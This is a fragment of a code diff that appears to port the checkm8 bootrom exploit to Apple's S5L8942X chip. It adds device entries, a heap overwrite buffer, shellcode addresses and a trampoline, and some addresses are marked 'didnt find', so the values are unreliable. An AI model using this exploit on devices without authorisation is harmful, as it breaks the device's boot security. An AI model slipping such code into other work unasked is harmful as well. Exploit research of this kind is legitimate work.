@@ -1,3 +1,18 @@
+  usexec.py:
+ExecConfig(('SecureROM for s5l8942xsi, Copyright 2011, Apple Inc.',   'RELEASE',     'rom'),          aes_crypto_cmd=0x7300+1),
+  
+  
+  
+  
+  checkm8.py:
+  
+  DeviceConfig('rom',               0x8942,  626, s5l8942x_overwrite, None, None),  # S5L8942
+  
+  
+  s5l8942x_overwrite = '\0' * 0x660 + struct.pack('<20xI4x', 0x34000000)
+  
+  
+  
   if cpid == 0x8942:
     constants_usb_s5l8942x = [
                 0x34000000, # 1 - LOAD_ADDRESS feito
@@ -15,7 +30,7 @@
                 0x34039800, # 5 - PAYLOAD_DEST find
       PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
         PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
-                0x3402D98C, # 8 - PAYLOAD_PTR didnt find
+                0x3402D944, # 8 - PAYLOAD_PTR didnt find
     ]
     s5l8942x_handler = asm_thumb_trampoline(0x34039800+1, 0x80E0+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s5l8942x)[8:]
     s5l8942x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8942x)
